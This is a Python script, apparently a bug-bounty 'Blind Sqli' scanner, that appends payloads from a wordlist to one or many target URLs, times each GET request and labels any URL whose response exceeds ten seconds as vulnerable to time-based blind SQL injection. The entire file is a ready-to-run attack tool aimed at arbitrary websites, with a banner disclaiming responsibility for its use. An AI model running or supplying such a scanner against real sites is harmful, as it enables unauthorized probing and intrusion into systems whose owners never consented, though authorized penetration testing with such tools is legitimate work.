import signal
import sys
import random
import string
import time
import requests
import argparse  

red = "\033[91m"
green = "\033[92m"
blue = "\033[94m"
yellow = "\033[93m"
white = "\033[97m"
black = "\033[90m"
reset = "\033[0m" 

def signal_handler(sig, frame):
    print(f"{yellow}Process interrupted by user.")
    sys.exit(0)   

signal.signal(signal.SIGINT, signal_handler)



# Banner to display
banner = """ 
       +=======================================+
       |..........Blind Sqli  v 1.........     |
       +---------------------------------------+
       |#Author: Jamaal Ahmed                  |
       |#Contact: Telegram @jamaal_ahmedy      |
       |#Date: Mon Aug 14  2024                |
       |#This tool is made for pentesting.     |
       |#Changing the description of this tool |
       |Won't make you the coder ^_^ !!!       |
       |#Respect Coderz ^_^                    |
       |#I take no responsibilities for the    |
       |  use of this program !                |
       +=======================================+
       |.........Bug bounty tool v 1.........  |
       +---------------------------------------+"""

# Print the banner in yellow color
print(f"{blue}{banner}{reset}")

# Set up argument parsing
parser = argparse.ArgumentParser(description=f"{blue}Check for SQL Injection vulnerabilities.{reset}")
parser.add_argument("-u", "--url", help="Base URL to scan for vulnerabilities (use only if multi_urls is not provided)")
parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
parser.add_argument("-t", "--multi_urls", help="Path to the file containing multiple URLs (one per line)")

args = parser.parse_args()  # Parse the arguments

# Read the wordlist file
with open(args.wordlist, "r") as f:
    wordlist = f.readlines()  # Read all lines from the wordlist file

# Read the URLs
urls = []
if args.multi_urls:
    # Read URLs from the file
    with open(args.multi_urls, "r") as f:
        urls = f.readlines()  # Read all lines from the multi-URLs file
else:
    # Use the single URL provided
    if args.url:
        urls = [args.url]

# Iterate over each URL
for base_url in urls:
    base_url = base_url.strip()  # Remove leading/trailing whitespace from the URL

    # Iterate over each payload in the wordlist
    for payload in wordlist:
        payload = payload.strip()  # Remove leading/trailing whitespace from the payload

        # Construct the full URL
        full_url = f"{base_url}{payload}"

        # Record the start time
        start_time = time.time()

        # Send the request
        try:
            response = requests.get(full_url)
        except requests.RequestException as e:
            print(f"{red}Request failed: {e}{reset}")
            continue

        # Record the end time
        end_time = time.time()

        # Calculate the response time
        result = end_time - start_time

        # Check if the response time indicates vulnerability
        if result > 10:
            print(f"{green}Vulnerable: {full_url}{reset}")
        else:
            print(f"{red}Not Vulnerable: {full_url}{reset}")